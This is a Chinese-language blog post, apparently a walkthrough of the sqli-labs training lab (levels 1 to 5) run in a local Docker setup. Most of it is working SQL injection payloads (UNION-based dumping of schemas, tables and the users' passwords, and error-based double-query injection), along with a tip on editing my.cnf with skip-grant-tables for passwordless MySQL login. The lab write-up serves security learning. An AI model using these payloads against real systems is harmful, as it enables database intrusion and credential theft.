<!--
	作者：Sariay
	时间：2018-09-25
	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
-->
<!DOCTYPE html>
<html class="html-loading">
		

<head><meta name="generator" content="Hexo 3.9.0">
	<meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <title>
    
      sql-lab 复现通关（深入学习） | ST0new Blog
    
  </title>
  <meta name="author" content="ST0new">
  <meta name="keywords" content>
  <meta name="description" content="博观而约取，厚积而薄发">
	<!-- favicon -->
  <link rel="shortcut icon" href="/img/favicon.ico">

  <!-- css -->
  <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="/css/Annie.css">
  
  <!-- jquery -->
	<script src="/js/jquery.min.js"></script>

  <!-- leancloud -->
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
<script src="/js/leancloud.js"></script>
</head>
	<body>
		<!-- Preloader -->

	<div id="preloader">
		<div class="pre-container">
			
				<div class="transition">
					<div class="three-bounce1"></div>
					<div class="three-bounce2"></div>
					<div class="three-bounce3"></div>
				</div>
						
		</div>
	</div>


<!-- header -->
<header class="fixbackground" data-img-mode="random" data-normal-src="/img/1.jpg" data-random-max="111" data-random-src="/img/Random-img/">
	<div class="mask">
		<!-- Logo and navigation -->
		<div class="h-header">
			<div id="logo">
				<a href="/">
						
						<img src="/img/logo.png" alt="Logo">
					
				</a>
			</div>
			
			<div id="navigation-show">
				<ul>
	
		<li class="menu-home">
			<a href="/" class="menu-item-home">主页</a>
		</li>
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive">归档</a>
		</li>
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories">分类</a>
		</li>
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags">标签</a>
		</li>
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about">关于</a>
		</li>
	
		<li class="menu-links">
			<a href="/links" class="menu-item-links">links</a>
		</li>
	

	
		<li class="menu-search">
			<a href="javascript:;" class="popup-trigger">搜索</a>
		</li>
	
</ul>
			</div>				
		</div>

		<!-- motto -->
		<div class="h-body">	
			
				<p class="motto"></p>
			
		</div>
		
		<!-- others: such as time... -->			
		<div class="h-footer">
			<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down" aria-hidden="true"></i>
			</a>

			
				<!-- 
	This is only a demo, please go to "https://time.is" to set your city time! 
-->
<style type="text/css">
	.header-date {
		font-size: 1.6rem;
		color: #fff;
		position: absolute;
		bottom: 5px;
		right: 1rem;
		writing-mode: tb-rl;
	}	
	
	.header-date a {
		border-bottom: none;
	}

	@media only screen and (max-width: 768 ) {
		.header-date {
			font-size: 1rem;
		}			
	}
</style>
<div class="header-date">
	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow" ></a>
	<span id="Beijing_z43d"></span>
</div>
<script src="//widget.time.is/zh.js"></script>
<script>
	time_is_widget.init({
		Beijing_z43d:{
			template:"DATE", 
			date_format:"year年 monthname dnum日"
		}
	});
</script>
			
		</div>
	</div>
</header>

<div id="navigation-hide">
	<!-- Progress bar -->
	<div id="progress-bar"></div>

	<!-- Progress percent -->
	<div id="progress-percentage"><h1>0.0%</h1></div>

	<div class="toc-switch"><span class="switch-button">目录</span></div>

	<!-- Page title -->
	<p>
		
			当前文章&nbsp;:&nbsp;《sql-lab 复现通关（深入学习）》
		
	</p>

	<!-- Nav trigger for navigation-H-->
	<a class="nav-trigger"><span></span></a>
</div>

<!-- Navigation in div(id="navigation-H") -->
<nav class="nav-container" id="cd-nav">
	<div class="nav-header">
		<h3>Navigation</h3>
		<a href="javascript:;" class="nav-close"></a>
	</div>
	<div class="nav-body">
		<ul>
	
		<li class="menu-home">
			<a href="/" class="menu-item-home">主页</a>
		</li>
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive">归档</a>
		</li>
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories">分类</a>
		</li>
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags">标签</a>
		</li>
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about">关于</a>
		</li>
	
		<li class="menu-links">
			<a href="/links" class="menu-item-links">links</a>
		</li>
	

	
		<li class="menu-search">
			<a href="javascript:;" class="popup-trigger">搜索</a>
		</li>
	
</ul>
	</div>
	<div class="nav-footer">
		<ul>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-github"></i>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-weibo"></i>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-pinterest"></i>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-instagram"></i>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<i class="fa fa-twitter"></i>
			</a>
		</li>
	
		<li>
			<a href="/atom.xml" target="_blank">
				<i class="fa fa-rss"></i>
			</a>
		</li>
			
</ul>

	</div>
</nav>
			
		<!--main-->
		<main>
			<!--
	时间：2018-11-17
	描述：
		插件名称：katelog.min.js
		插件作者：KELEN
		插件来源: https://github.com/KELEN/katelog
-->

	
		<div class="layout-toc">
			<div id="layout-toc">
				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
			</div>
		</div>

		
		<script src="/plugin/toc/katelog.min.js"></script>

		
	 

<div class="layout-post">
	<div id="layout-post">
	<div class="article-title">
		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
		
	<a href="/2019/10/04/web安全/sql注入/sql-lab-通关宝典/" itemprop="url">
		sql-lab 复现通关（深入学习）
	</a>

	</div>

	<div class="article-meta">
		<span>
			<i class="fa fa-calendar"></i>
			


	发布于

	<a href="/2019/10/04/web安全/sql注入/sql-lab-通关宝典/" itemprop="url">
		<time datetime="2019-10-04T02:20:35.000Z" itemprop="datePublished">
	  		2019-10-04
	  </time>
	</a>
	&nbsp;





			




	更新于

	<a href="/2019/10/04/web安全/sql注入/sql-lab-通关宝典/" itemprop="url">
		<time datetime="2019-10-04T02:20:35.000Z" itemprop="dateUpdated">
	  		2019-10-04
	  </time>
	</a> 



		</span>
		<span>
			<i class="fa fa-tags"></i>
			
	
		<a href="/tags/sql注入/" class=" ">
			sql注入
		</a>
	
		
		</span>
		
		

	
    <span class="leancloud_visitors" id="/2019/10/04/web安全/sql注入/sql-lab-通关宝典/_visitors" data-url="/2019/10/04/web安全/sql注入/sql-lab-通关宝典/" data-title="sql-lab 复现通关（深入学习）">
       	<i class="fa fa-eye"></i>
       	热度
        <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
    </span>
    



	
    <span class="leancloud_likes" id="/2019/10/04/web安全/sql注入/sql-lab-通关宝典/_likes" data-url="/2019/10/04/web安全/sql注入/sql-lab-通关宝典/" data-title="sql-lab 复现通关（深入学习）" rel="unlike">
        <i class="fa fa-heart"></i>
        喜欢
        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
    </span>

	</div>

	<div class="article-content" id="article-content">
		<p>Docker 搭建环境 sql-labs 通关</p>
<a id="more"></a>



<h1 id="sql-lab-复现通关（深入学习）"><a href="#sql-lab-复现通关（深入学习）" class="headerlink" title="sql-lab 复现通关（深入学习）"></a>sql-lab 复现通关（深入学习）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqllab 从基础到复杂， 对于初学者练习非常有用。</p>
<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>学习如何进攻才能懂得如何防守</p>
<h2 id="less-1-基于错误的单引号字符串"><a href="#less-1-基于错误的单引号字符串" class="headerlink" title="less-1 基于错误的单引号字符串"></a>less-1 基于错误的单引号字符串</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">http://192.168.248.134:8080/Less-1/?id=1</span><br><span class="line"></span><br><span class="line">- 添加 ' </span><br><span class="line">	返回报错信息：You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your     MySQL  <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 使用 1'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> %<span class="number">23</span></span><br><span class="line">	得到列数为<span class="number">3</span></span><br><span class="line"></span><br><span class="line">- 使用<span class="keyword">union</span> 获取<span class="keyword">admin</span>和<span class="keyword">password</span></span><br><span class="line">	<span class="number">-1</span> 的作用是查询不存在的值，使得结果为空</span><br><span class="line">	<span class="number">-1</span> <span class="string">' union select 1,2,3 // 确定可以显示到页面的位置</span></span><br><span class="line"><span class="string">	-1 '</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata // 得到数据库名 或 通过<span class="keyword">database</span>() 获取数据库名</span><br><span class="line">	<span class="number">-1</span> <span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = '</span><span class="keyword">security</span><span class="string">' %23</span></span><br><span class="line"><span class="string">	-1 '</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'users'</span>%<span class="number">23</span></span><br><span class="line">	<span class="number">-1</span> <span class="string">' union select 1,username,password from users %23</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>思考一下，为什么加上引号后会报错</p>
</blockquote>
<p>查看源码 直接将web页面传递的值加入sql语句中，没有进行过滤导致的错误</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-5fdec2ae2a7dba5e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>再来看看web页面返回的错误</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-f93cc0e7d38d1726?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>接下来分析 为何加了’ 导致报错</p>
<p>我们分析一下他的源码,在数据库中执行一下</p>
<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
<p>这里加不加单引号都可以，id是int型的，可以不加 ，也可以加，而username和password字段都是char类型，就必须加引号。<br><img src="https://upload-images.jianshu.io/upload_images/18851353-997982c3f27d56a8?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>然后，我们尝试添加一些特殊的字符，干扰正常的数据输入，达到执行其他语句的目的，这就是sql注入，所有的sql注入都是这个道理，如果没有和数据库进行交互，那么也就构不成注入的条件，比如后面的二次注入，虽然第一次没有报错和注入条件，但是在后期会利用时，由于过滤不当导致注入。</p>
<p>我们看一下这一句，当我们输入1’# 的时候，回车还需要一个冒号作为闭合，为什么呢，因为系统在读取到#的同时将不会继续往下读，而是当做注释忽略了，这就达成了绕过的目的。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-dc2e919adafc67d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>而这时，如果我们在1’ 之后添加一些其他的内容，获取可以获取想要的答案，可以看到通过union 联合查询，我们可以获取到两个数据，</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-a51299cba59152d9?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>但是 web页面只会返回第一条数据，如何返回第二条呢，这里就需要让第一条数据未查询到，经过修改，成功让我们需要的数据返回页面，这时 就可以通过联合查询获取想要的数据</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-52988f53eb51e9fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>这里也可以使用burp去fuzz一下，获取报错类型，判断绕过方式，burp也自带了fuzz，可以在渗透或者ctf中做判断，猜测过滤的内容对如何去绕过有非常大的帮助</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-2dfd8d773fef0a45?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-658f3930b56cd403?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>查看burp返回的内容，933代表正常的内容返回，而1042返回的是报错内容，基于这个前提，我们就想办法去绕过<br><img src="https://upload-images.jianshu.io/upload_images/18851353-348f92df82d3f069?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>基本简单的注入就是这个样子 快开始真正的实践吧</p>
<p>基本判断注入通过加‘ 是否报错,先记住这里的报错，等下的双引号报错和这里可以形成类比，可以判断1周围都是单引号。那么我们就要通过某些方式去闭合他，</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-f7d404ee7f0411a5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>

<p>这里介绍两种方式，一种是注释，另一种是通过引号闭合 如果有时候waf过滤了注释符 可以通过另一种方式绕过</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-bfecccd17080f24a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"><br><img src="https://upload-images.jianshu.io/upload_images/18851353-63a496c934282000?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>接下来就是获取用户名和密码了</p>
<p>一般sql注入的步骤 ： 字段数-&gt;数据库-&gt;表-&gt;列-&gt;值</p>
<p>字段数可以通过 order by 去猜解 或者 通过 union select 1,2,3, 4 这样是试。如果报错那么就不是</p>
<p>首先获取字段数，通过order by 3  返回正确的值，而order by 4 返回错误</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-f85f9875d2e54e69?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>接来下 通过联合查询 获取数据库和表以及最后的password</p>
<p>这里就不多演示了，可以根据我给的数据去尝试</p>
<h2 id="Less-2-基于错误的get整型注入"><a href="#Less-2-基于错误的get整型注入" class="headerlink" title="Less-2 基于错误的get整型注入"></a>Less-2 基于错误的get整型注入</h2><p>前面的题基本都会写出每一个步骤，到后面就专精于如何绕过</p>
<p>顺便普及一波知识</p>
<p>mysql的注释符一般有三种</p>
<p><code>--</code>, 单行注释</p>
<p><code>#</code> 单行注释</p>
<p><code>/**/</code> 多行注释 </p>
<p>注意– 不是注释符，–后还需要一个空格 ，而在web中 + 和空格等价，这就是为何我们注释符喜欢使用–+的原因了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问 </span><br><span class="line">	http://192.168.248.144:8080/Less-2/?id=1 </span><br><span class="line">- 绕过测试</span><br><span class="line">	-1' or 1=1 <span class="comment">--+  //数字型注入</span></span><br><span class="line">- 常规操作获取用户名和密码</span><br><span class="line">	-1' or 1=1  order by 3  <span class="comment">--+ // 字段数为3</span></span><br><span class="line">	学了注释符就需要实地去应用,可以看到这道题我们用注释符忽略了引号带来的影响</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-14bd86622ae5df5e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata  --+ // 获取数据库</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-8d2bbdcc76933073?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like &apos;security&apos;  --+ // 获取表</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-8b51ceae70d57c75?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,2,group_concat(column_name ) from information_schema.columns where table_name like &apos;users&apos;  --+ // 获取字段值</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-915b057c42b4bf3c?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,2,group_concat(0x7e,username,0x7c,password) from users  --+ // 获取数据</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-8bcb3abd043cbf7f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-3-基于错误的get单引号变形字符型注入"><a href="#Less-3-基于错误的get单引号变形字符型注入" class="headerlink" title="Less-3 基于错误的get单引号变形字符型注入"></a>Less-3 基于错误的get单引号变形字符型注入</h2><p>这里普及一个知识点，如何不使用密码登录mysql，试想你拿到了一个用户的低权限账户，但是他对my.cnf 具有可写的权限，就可以通过修改my.cnf 进而登录数据库。如果数据库的存储方式可被允许，那么可以变像的提权。</p>
<p>这里就不介绍他如何提权了。</p>
<p>linux的mysql配置文件在/etc/mysql/my.cnf下</p>
<p>在[mysqld]下添加 skip-grant-tables 如图，</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-8e0d4b529a72ec1e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"><br>之后重启mysql服务 </p>
<p>mysql  service mysqld restart</p>
<p>成功免密登录</p>
<p>这里和前面闭合有所不同，来看一下源码</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-5dad96c1f8973704?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"><br>id先被引号包括，之后使用（）在包括，所以闭合方式也就需要 <code>&#39;)</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">	http://192.168.248.144:8080/Less-3/?id=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 绕过</span><br><span class="line">	id=1') --+</span><br><span class="line">- 获取数据</span><br><span class="line">	-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+</span><br><span class="line">	-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users' --+</span><br><span class="line">	-1') union select 1,2,group_concat(0x7c,username,0x7e,password,0x7c) from users --+</span><br></pre></td></tr></table></figure>

<p>-猜测注入类型<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1 </p>
<p> 根据这个提示猜测可能是字符型注入,可以和less-1 对比，发现多了一个） 可以判断首先是’$id’ 之后在id外还有一层括号 (‘$id’)</p>
<p>所以如果报错可以返回，那么如何绕过就变得很简单了。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-0f1f899b0eea2733?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>获取数据，这里演示一下获取password</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-6e5ff6514ba0e85a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-4-基于错误的GET双引号字符型注入"><a href="#Less-4-基于错误的GET双引号字符型注入" class="headerlink" title="Less-4 基于错误的GET双引号字符型注入"></a>Less-4 基于错误的GET双引号字符型注入</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">http://192.168.248.144:8080/Less-4/?id=2</span><br><span class="line"></span><br><span class="line">- 绕过</span><br><span class="line">	id=2") or 1=1 --+</span><br><span class="line">- 获取数据</span><br><span class="line">	-1") union select 1,2,database()  --+</span><br><span class="line">	-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= database()  --+</span><br><span class="line">	-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name= 'users'  --+</span><br><span class="line">	-1") union select 1,2,group_concat(0x7c,username,0x7e,password,0x7c) from users  --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">猜测注入类型</span><br><span class="line">2&quot;</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;2&quot;&quot;) LIMIT 0,1&apos; at line 1 </span><br><span class="line">可能是双引号字符型注入</span><br></pre></td></tr></table></figure>

<p>先来看看为何加<code>&#39;</code> 之后没有报错，</p>
<p>我们经过几次演示，应该都知道id是被引号包括的 而如果包括的是单引号比如 <code>&#39;$id&#39;</code>，那么我们添加单引号会导致引号未闭合，报错，那如果是’$id”‘这种，虽然双引号没有闭合，但是他在闭合的单引号里，所以这里他的作用只是一个引号，而不是闭合作用，这就解释了 为何添加其他字符达不到闭合的目的。<br><img src="https://upload-images.jianshu.io/upload_images/18851353-f734188dae608fb0?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>这里我们就需要去试 那些字符可以产生闭合，导致报错，可以借助于我上面写的burp爆破</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-d4af7311d6d019f2?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-5-双注入GET单引号字符型注入"><a href="#Less-5-双注入GET单引号字符型注入" class="headerlink" title="Less-5 双注入GET单引号字符型注入"></a>Less-5 双注入GET单引号字符型注入</h2><p>tips： 双注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">as ： 别名 </span><br><span class="line">	顺便说几个常见的:</span><br><span class="line">		rand: 遵循四舍五入把原值转化为指定小数位数</span><br><span class="line">		floor: 向下舍入为指定小数位数</span><br><span class="line">		ceiling: 向上舍入为指定小数位数</span><br><span class="line">	rand: 返回一个介于 0 到 1（不包括 0 和 1）之间的伪随机 float 值</span><br><span class="line">	group by: GROUP BY必须得配合聚合函数来用，根据字段来分类</span><br><span class="line">- 使用</span><br><span class="line">select count(*) from [table] group by concat(&apos;~&apos;,([真正的查询语句]),&apos;~&apos;，floor(rand(0)*2))</span><br><span class="line">或</span><br><span class="line">select count(*),concat_ws(char(32,58,32),([查询语句]),floor(rand(0)*2)) as a from [table] group by a</span><br><span class="line">- 原理</span><br><span class="line">简单来说就是count等聚合函数之后，如果使用分组语句，就会把查询的一部分以错误的形式显示出来</span><br></pre></td></tr></table></figure>

<p>先来看看内部的查询返回的结果<br><img src="https://upload-images.jianshu.io/upload_images/18851353-a70f8d01370e467a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>在看看rand()函数，当不指定时 返回一个0-1的随机数</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-51154fe7ac31dfb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>而我们需要的是一个整数，这里就需要floor（） 返回的结果只有1和0 这样如果是0的时候就会引发报错，</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-2e371fdbac7b6765?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"><br>在更进一步去查看，user表里有多少数据，就返回多少条</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-43cd4771b814747b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>而这一题没有回显 但是有报错，我们就需要构造特殊的语句，将数据显示在报错里，来读取数据</p>
<p>可以看到 如果rand是1 没有报错 ，而rand值为0 则会触发报错，第五题会把报错返回，但是正确不会返回，所以我们利用双注可以从另一方面获取数据<br><img src="https://upload-images.jianshu.io/upload_images/18851353-753cae99175da40e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>接下来我们肯定不能通过多次执行获取报错值，经过研究，发现如果给<code>rand（0）</code> 这样就可以让他返回的值固定进而一直满足条件</p>
<p>这里因为group by 查询时 如果返回的结果不一致就会导致报错。也就是说如果我们可以在检测时和插入时构造不同的返回值就会导致报错。<br><img src="https://upload-images.jianshu.io/upload_images/18851353-711fb703c1e57e27.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>赶紧进入实战学习学习</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">	http://192.168.248.144:8080/Less-5/?id=1</span><br><span class="line">- 猜测注入类型</span><br><span class="line">	id=&apos;1</span><br><span class="line">	 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;1&apos; LIMIT 0,1&apos; at line 1</span><br><span class="line">	 可能存在单引号注入</span><br><span class="line">- 绕过</span><br><span class="line">	由于返回的结果只有两种（不包含报错）所以这里可以采用盲注来进行，但是作者的意图不是让我们使用盲注，而是双注.</span><br><span class="line">	双注： 当查询语句的前面出现聚合函数 就是多个返回结果count()就是多行的意思 后面的查询结果代码会以错误的形式显示出来</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 获取数据</span><br><span class="line">	// 如果随机值为0 则会返回 you are in .....， 三条记录以上绝对报错 rand(0),两条随机报错</span><br><span class="line">	-1&apos; union all select count(*),2,concat( &apos;~&apos;,(select schema_name from information_schema.schemata limit 4,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.schemata group by a %23 	// 获取 数据库 security 这里最好实用union all 这样，否则需要多次访问才能获取回复</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-ca2517b5d2b43740?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">剩下的就不一一叙述了</span><br><span class="line">-1&apos; union all select count(*),2,concat( &apos;~&apos;,(select table_name from information_schema.tables where table_schema = &apos;security&apos; limit 3,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.schemata group by a %23 //获取表 users</span><br><span class="line">	-1&apos; union all select count(*),1,concat( &apos;~&apos;,(select column_name from information_schema.columns where table_name= &apos;users&apos; limit 2,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.schemata group by a %23  // 这里爆出了他三个字段，注意如果字段不存在也是返回you are in </span><br><span class="line">	-1&apos; union all select count(*),1,concat( &apos;~&apos;,(select concat(id,username,password) from users limit 2,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.schemata group by a %23  // 成功拿到 password username</span><br></pre></td></tr></table></figure>

